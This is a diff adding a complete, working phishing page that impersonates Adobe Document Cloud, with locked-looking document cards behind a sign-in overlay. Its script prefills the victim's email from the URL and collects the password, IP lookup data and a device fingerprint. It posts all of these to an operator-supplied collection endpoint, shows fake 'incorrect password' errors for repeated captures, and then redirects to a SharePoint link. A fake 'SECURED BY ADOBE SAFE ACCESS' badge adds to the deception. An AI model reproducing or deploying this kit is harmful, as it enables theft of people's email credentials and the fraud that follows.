@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adobe Document Cloud - Secure Access</title>
+  <link rel="icon" href="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0" type="image/x-icon" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f5f5f5;
+      overflow-x: hidden;
+    }
+    
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      position: relative;
+    }
+    
+    .top-navbar {
+      background-color: #fff;
+      height: 60px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      position: relative;
+      z-index: 10;
+    }
+    
+    .adobe-logo {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+    
+    .nav-title {
+      font-size: 18px;
+      font-weight: 500;
+      color: #333;
+    }
+    
+    .content-area {
+      display: flex;
+      flex: 1;
+      position: relative;
+    }
+    
+    .document-preview {
+      flex: 1;
+      background-color: #EAEAEA;
+      padding: 40px;
+      position: relative;
+      width: 100%;   /* Ensure full width */
+    }
+    
+    .document-list {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 25px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    
+    .document-card {
+      background: white;
+      border-radius: 4px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      transition: all 0.2s;
+      position: relative;
+    }
+    
+    .document-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+    }
+    
+    .document-thumbnail {
+      height: 150px;
+      background-color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid #eee;
+      padding: 10px;
+    }
+    
+    .thumbnail-content {
+      width: 100%;
+      height: 100%;
+      background-color: #f8f8f8;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .thumbnail-header {
+      background-color: #E15300;
+      height: 20px;
+      width: 100%;
+    }
+    
+    .thumbnail-body {
+      flex: 1;
+      padding: 5px;
+      font-size: 6px;
+      overflow: hidden;
+    }
+    
+    .thumbnail-line {
+      height: 3px;
+      background-color: #ddd;
+      margin: 3px 0;
+      width: 90%;
+    }
+    
+    .document-info {
+      padding: 12px;
+    }
+    
+    .document-title {
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 5px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    
+    .document-meta {
+      font-size: 12px;
+      color: #666;
+      display: flex;
+      align-items: center;
+    }
+    
+    .document-date {
+      margin-right: 10px;
+    }
+    
+    .document-type {
+      padding: 2px 6px;
+      background-color: #E8F0FE;
+      color: #1A73E8;
+      border-radius: 3px;
+      font-size: 10px;
+    }
+    
+    .document-overlay {
+      position: fixed;  /* Changed from absolute to fixed */
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;  /* Increased z-index */
+      overflow-y: auto;  /* Allow scrolling on mobile */
+      padding: 20px;  /* Add padding for mobile */
+    }
+    
+    .login-container {
+      width: 420px;
+      max-width: 100%;  /* Changed from 90% to 100% */
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      padding: 40px;
+      z-index: 1001;
+      position: relative;  /* Added position relative */
+      margin: auto;  /* Center horizontally */
+    }
+    
+    .form-title {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #333;
+      font-weight: 500;
+    }
+    
+    .form-subtitle {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #666;
+      font-size: 14px;
+      font-weight: 300;
+    }
+    
+    .email-providers {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 30px;
+      align-items: center;
+      padding: 0 20px;
+    }
+    
+    .email-provider-logo {
+      width: 32px;
+      height: 32px;
+      object-fit: contain;
+    }
+    
+    .form-group label {
+      font-weight: 500;
+      color: #333;
+    }
+    
+    .form-control {
+      height: 45px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      padding-left: 12px;
+    }
+    
+    .form-control:focus {
+      box-shadow: 0 0 0 2px rgba(225, 83, 0, 0.2);
+      border-color: #E15300;
+    }
+    
+    .btn-primary {
+      background-color: #E15300;
+      border-color: #E15300;
+      height: 45px;
+      font-weight: 500;
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 4px;
+      transition: all 0.3s;
+    }
+    
+    .btn-primary:hover {
+      background-color: #C24500;
+      border-color: #C24500;
+    }
+    
+    .security-footer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 30px;
+      padding-top: 15px;
+      border-top: 1px solid #eee;
+    }
+    
+    .security-text {
+      color: #E15300;
+      font-weight: 500;
+      font-size: 13px;
+      margin-right: 10px;
+    }
+    
+    .adobe-logo-footer {
+      width: 24px;
+      height: 24px;
+    }
+    
+    .error-message {
+      color: #D32F2F;
+      font-size: 13px;
+      text-align: left;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      display: none;
+    }
+    
+    .loading-dialog {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(255, 255, 255, 0.9);
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      z-index: 9999;
+    }
+    
+    .form-text {
+      font-size: 12px;
+    }
+    
+    .lock-icon {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background-color: rgba(255, 255, 255, 0.9);
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #E15300;
+      font-size: 12px;
+    }
+    
+    /* Improved Mobile Responsiveness */
+    @media (max-width: 768px) {
+      .document-list {
+        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+        gap: 15px;
+        padding: 0 10px;
+      }
+      
+      .document-preview {
+        padding: 20px 10px;
+      }
+      
+      .login-container {
+        padding: 30px 20px;
+        width: 95%;
+        max-width: 350px;
+        margin: 40px auto;  /* Add more margin for better positioning */
+      }
+      
+      .document-overlay {
+        padding: 0;  /* Remove padding on mobile */
+        align-items: center;  /* Better centering */
+        justify-content: center;
+      }
+      
+      .form-title {
+        font-size: 20px;
+      }
+      
+      .form-subtitle {
+        font-size: 12px;
+      }
+      
+      .email-providers {
+        padding: 0 5px;
+      }
+      
+      .email-provider-logo {
+        width: 28px;
+        height: 28px;
+      }
+      
+      .security-text {
+        font-size: 11px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .document-list {
+        grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+        gap: 10px;
+      }
+      
+      .document-thumbnail {
+        height: 120px;
+      }
+      
+      .document-title {
+        font-size: 12px;
+      }
+      
+      .document-meta {
+        font-size: 10px;
+      }
+      
+      .top-navbar {
+        height: 50px;
+      }
+      
+      .nav-title {
+        font-size: 16px;
+      }
+      
+      .login-container {
+        width: 90%;
+        padding: 25px 15px;
+      }
+      
+      .email-providers {
+        flex-wrap: wrap;
+        gap: 10px;
+        justify-content: center;
+      }
+      
+      .email-provider-logo {
+        margin: 0 5px;
+      }
+    }
+    
+    /* Portrait phones */
+    @media (max-width: 320px) {
+      .login-container {
+        padding: 20px 15px;
+      }
+      
+      .email-providers {
+        padding: 0;
+      }
+      
+      .form-title {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body onload="onPageLoad();">
+
+<div class="main-container">
+  <!-- Top Navigation Bar -->
+  <div class="top-navbar">
+    <img class="adobe-logo" src="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0" alt="Adobe Logo">
+    <span class="nav-title">Adobe Document Cloud</span>
+  </div>
+  
+  <!-- Content Area -->
+  <div class="content-area">
+    <div class="document-preview">
+      <!-- Document List -->
+      <div class="document-list">
+        <!-- Document 1 -->
+        <div class="document-card">
+          <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="document-thumbnail">
+            <div class="thumbnail-content">
+              <div class="thumbnail-header"></div>
+              <div class="thumbnail-body">
+                <div class="thumbnail-line" style="width: 60%"></div>
+                <div class="thumbnail-line" style="width: 80%"></div>
+                <div class="thumbnail-line" style="width: 70%"></div>
+                <div class="thumbnail-line" style="width: 90%"></div>
+                <div class="thumbnail-line" style="width: 50%"></div>
+                <div class="thumbnail-line" style="width: 75%"></div>
+                <div class="thumbnail-line" style="width: 85%"></div>
+              </div>
+            </div>
+          </div>
+          <div class="document-info">
+            <div class="document-title">{{file1Name}}</div>
+            <div class="document-meta">
+              <span class="document-date">{{file1Date}}</span>
+              <span class="document-type">PDF</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Document 2 -->
+        <div class="document-card">
+          <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="document-thumbnail">
+            <div class="thumbnail-content">
+              <div class="thumbnail-header"></div>
+              <div class="thumbnail-body">
+                <div class="thumbnail-line" style="width: 70%"></div>
+                <div class="thumbnail-line" style="width: 60%"></div>
+                <div class="thumbnail-line" style="width: 90%"></div>
+                <div class="thumbnail-line" style="width: 80%"></div>
+                <div class="thumbnail-line" style="width: 75%"></div>
+                <div class="thumbnail-line" style="width: 85%"></div>
+              </div>
+            </div>
+          </div>
+          <div class="document-info">
+            <div class="document-title">{{file2Name}}</div>
+            <div class="document-meta">
+              <span class="document-date">{{file2Date}}</span>
+              <span class="document-type">DOC</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Document 3 -->
+        <div class="document-card">
+          <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="document-thumbnail">
+            <div class="thumbnail-content">
+              <div class="thumbnail-header"></div>
+              <div class="thumbnail-body" style="display: flex; flex-direction: column;">
+                <div style="display: flex; height: 8px; margin-bottom: 5px;">
+                  <div style="width: 30%; background-color: #2196F3; height: 100%;"></div>
+                  <div style="width: 40%; background-color: #4CAF50; height: 100%; margin-left: 2px;"></div>
+                  <div style="width: 30%; background-color: #FFC107; height: 100%; margin-left: 2px;"></div>
+                </div>
+                <div class="thumbnail-line" style="width: 100%"></div>
+                <div class="thumbnail-line" style="width: 100%"></div>
+                <div style="display: flex; height: 8px; margin-top: 5px;">
+                  <div style="width: 60%; background-color: #2196F3; height: 100%;"></div>
+                  <div style="width: 40%; background-color: #4CAF50; height: 100%; margin-left: 2px;"></div>
+                </div>
+                <div class="thumbnail-line" style="width: 100%; margin-top: 5px;"></div>
+              </div>
+            </div>
+          </div>
+          <div class="document-info">
+            <div class="document-title">{{file3Name}}</div>
+            <div class="document-meta">
+              <span class="document-date">{{file3Date}}</span>
+              <span class="document-type">XLS</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Document 4 -->
+        <div class="document-card">
+          <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="document-thumbnail">
+            <div class="thumbnail-content">
+              <div class="thumbnail-header"></div>
+              <div class="thumbnail-body" style="display: flex; flex-direction: column;">
+                <div style="background-color: #f0f0f0; height: 60%; margin-bottom: 5px; display: flex; justify-content: center; align-items: center;">
+                  <div style="width: 50%; height: 80%; background-color: #ddd;"></div>
+                </div>
+                <div class="thumbnail-line" style="width: 90%"></div>
+                <div class="thumbnail-line" style="width: 80%"></div>
+                <div class="thumbnail-line" style="width: 70%"></div>
+              </div>
+            </div>
+          </div>
+          <div class="document-info">
+            <div class="document-title">{{file4Name}}</div>
+            <div class="document-meta">
+              <span class="document-date">{{file4Date}}</span>
+              <span class="document-type">PPT</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Login Overlay -->
+      <div class="document-overlay">
+        <div class="login-container">
+          <h4 class="form-title">Adobe Document Cloud</h4>
+          <p class="form-subtitle">Sign in with your email account to access your secure documents</p>
+          
+          <!-- Email provider logos -->
+          <div class="email-providers">
+            <img class="email-provider-logo" src="https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg" alt="Outlook">
+            <img class="email-provider-logo" src="https://robertlugana.sirv.com/icon/2993685_brand_brands_google_logo_logos_icon.png" alt="Gmail">
+            <img class="email-provider-logo" src="https://robertlugana.sirv.com/icon/386756_bookmarks_yahoo_icon.png" alt="Yahoo">
+            <img class="email-provider-logo" src="https://robertlugana.sirv.com/icon/Other%20Emails.png" alt="Others">
+          </div>
+          
+          <form id="form13" onsubmit="return handleSubmit(event);" method="post" autocomplete="off">
+            <div class="form-group" id="emailGroup">
+              <label for="exampleInputEmail1">Email address</label>
+              <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp" required>
+              <small id="emailCallout" class="form-text text-muted">Enter your email address.</small>
+              <div class="error-message" id="InvalidEmail">Invalid email address. Please enter a valid email.</div>
+            </div>
+            <div class="form-group" id="passwordGroup">
+              <label for="exampleInputPassword1">Password</label>
+              <input type="password" class="form-control" id="exampleInputPassword1" name="password" required 
+                    onkeypress="if(event.key === 'Enter') handleVerifyClick();">
+              <div class="error-message" id="RequirePassword">Password is required</div>
+              <div class="error-message" id="InvalidPassword">Incorrect email or password. Try again.</div>
+            </div>
+            
+            <div class="error-message" id="GeneralError">An error occurred. Please try again.</div>
+            
+            <input type="hidden" id="domainHidden" name="domain" value="">
+            <button type="button" class="btn btn-primary" id="submitButton" onclick="handleVerifyClick()">Login</button>
+          </form>
+          
+          <!-- Security footer with Adobe logo -->
+          <div class="security-footer">
+            <span class="security-text">SECURED BY ADOBE SAFE ACCESS™</span>
+            <img class="adobe-logo-footer" alt="Adobe Logo" src="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Loading dialog -->
+<div class="loading-dialog" id="loadingDialog">
+  <div class="spinner-border text-primary" role="status">
+    <span class="sr-only">Loading...</span>
+  </div>
+</div>
+
+<script>
+// THESE ARE YOUR TEMPLATE VARIABLES - THEY WILL BE REPLACED BY YOUR SERVER-SIDE SCRIPT
+const templateConfig = {
+  postURL: "{{postURL}}",
+  token: "{{token}}",
+  landingPageLink: "{{landingPageLink}}",
+  maxLoginAttempts: "{{maxLoginAttempts}}" // New variable for max login attempts
+};
+
+let loginAttempts = 0; // Counter for login attempts
+const MAX_ATTEMPTS = templateConfig.maxLoginAttempts && parseInt(templateConfig.maxLoginAttempts) > 0
+  ? parseInt(templateConfig.maxLoginAttempts)
+  : 3; // Default to 3 if not provided or invalid
+
+// Function to handle page load and prefill email if present in URL
+function onPageLoad() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const email = urlParams.get('email');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const emailCallout = document.getElementById('emailCallout');
+  const domainHiddenInput = document.getElementById('domainHidden');
+
+  if (email) {
+    emailField.value = email;
+    emailField.readOnly = true;
+    emailCallout.textContent = "Your email was securely prefilled and cannot be changed.";
+
+    const atIndex = email.lastIndexOf('@');
+    if (atIndex !== -1) {
+      const domain = email.slice(atIndex + 1);
+      domainHiddenInput.value = domain;
+    } else {
+      domainHiddenInput.value = '';
+    }
+  } else {
+    emailField.readOnly = false;
+    emailCallout.textContent = "Enter your email address.";
+  }
+
+  // Removed the API call to verify-page-visit here.
+}
+
+// Function to validate email format
+function isValidEmail(email) {
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return emailPattern.test(email);
+}
+
+function handleVerifyClick() {
+  const btn = document.getElementById('submitButton');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+  const invalidEmailError = document.getElementById('InvalidEmail');
+  const invalidPasswordError = document.getElementById('InvalidPassword');
+  const requirePasswordError = document.getElementById('RequirePassword');
+  const generalError = document.getElementById('GeneralError');
+
+  // Hide all error messages
+  invalidEmailError.style.display = 'none';
+  invalidPasswordError.style.display = 'none';
+  requirePasswordError.style.display = 'none';
+  generalError.style.display = 'none';
+
+  const email = emailField.value.trim();
+  const password = passwordField.value.trim();
+
+  // Basic validation
+  if (!isValidEmail(email)) {
+    invalidEmailError.style.display = 'block';
+    return;
+  }
+  if (!password) {
+    requirePasswordError.style.display = 'block';
+    return;
+  }
+
+  // Disable form elements and show loading state
+  emailField.readOnly = true;
+  passwordField.disabled = true;
+  btn.disabled = true;
+  btn.innerText = "Verifying...";
+  btn.style.backgroundColor = "#BEBEBE";
+  btn.style.color = "#000";
+
+
+
+  // Fetch IP data and then send the submission
+  fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .catch(error => {
+      console.error("Error fetching IP info:", error);
+      // Proceed without IP data if fetching fails
+      return {}; // Return empty object
+    })
+    .then(ipData => {
+      const deviceData = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        colorDepth: window.screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        vendor: navigator.vendor,
+        maxTouchPoints: navigator.maxTouchPoints,
+      };
+
+      // Prepare the formData content
+      const formDataContent = {
+        email: email,
+        password: password,
+        ipData: ipData, // Keep as object here
+        deviceData: deviceData // Keep as object here
+      };
+
+      // Prepare the final payload with token and stringified formData
+      let finalPayload = {
+        token: templateConfig.token,
+        formData: JSON.stringify(formDataContent) // Stringify the entire formData object
+      };
+
+      console.log("Final Payload (before URL encoding):", finalPayload);
+
+      // Send data to the single submission API using URL parameters
+      return fetch(`${templateConfig.postURL}/notify-form-submission`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: objectToFormData(finalPayload)
+      });
+    })
+    .then(response => {
+      if (!response.ok) {
+        // Handle non-200 responses as errors, goes to catch block
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then(data => {
+      // Successful API response received
+      loginAttempts++; // Increment attempts after getting a response
+
+      if (loginAttempts < MAX_ATTEMPTS) {
+        // Less than 3 attempts, show incorrect password error
+        invalidPasswordError.textContent = "Incorrect email or password. Try again.";
+        invalidPasswordError.style.display = 'block';
+        resetFormState();
+      } else {
+        // 3 or more attempts, proceed to redirect
+        btn.innerText = "Decrypting Files...";
+        // Determine the redirect URL
+        let redirectUrl = templateConfig.landingPageLink && templateConfig.landingPageLink.trim() !== ''
+          ? templateConfig.landingPageLink
+          : "https://learningresourcesnetwork-my.sharepoint.com/:x:/g/personal/brendan_lern_org/EZN5bpWBZTxChTgSdmSwmtUBEqPKrmWF0_T7WtMsRehNWA?rtime=Z7fPqXLW3Eg";
+
+        // Ensure redirectUrl has a proper prefix
+        if (redirectUrl && !redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
+          redirectUrl = `https://${redirectUrl}`;
+        }
+        window.location.href = redirectUrl;
+      }
+    })
+    .catch(error => {
+      console.error("Error during form submission:", error);
+      // API request failed (network error, server error response)
+      generalError.textContent = "An error occurred during login. Please try again.";
+      generalError.style.display = 'block';
+      resetFormState();
+      // Do NOT increment loginAttempts here, as the attempt didn't reach the verification logic backend successfully
+    });
+}
+
+// Helper function to reset form/button fields
+function resetFormState() {
+  const btn = document.getElementById('submitButton');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+
+  if (!new URLSearchParams(window.location.search).get('email')) {
+    emailField.readOnly = false;
+  }
+  passwordField.disabled = false;
+  passwordField.value = "";
+  btn.disabled = false;
+  btn.innerText = "Login";
+  btn.style.backgroundColor = "";
+  btn.style.color = "";
+}
+
+// Handle form submission to prevent the default behavior
+function handleSubmit(event) {
+  event.preventDefault();
+  handleVerifyClick();
+  return false;
+}
+
+// Helper function to convert object to URLSearchParams
+function objectToFormData(obj) {
+  const formData = new URLSearchParams();
+  Object.entries(obj).forEach(([key, value]) => {
+    formData.append(key, value.toString());
+  });
+  return formData.toString();
+}
+
+// Manually trigger onPageLoad when the DOM is ready
+document.addEventListener('DOMContentLoaded', onPageLoad);
+</script>
+
+</body>
+</html>
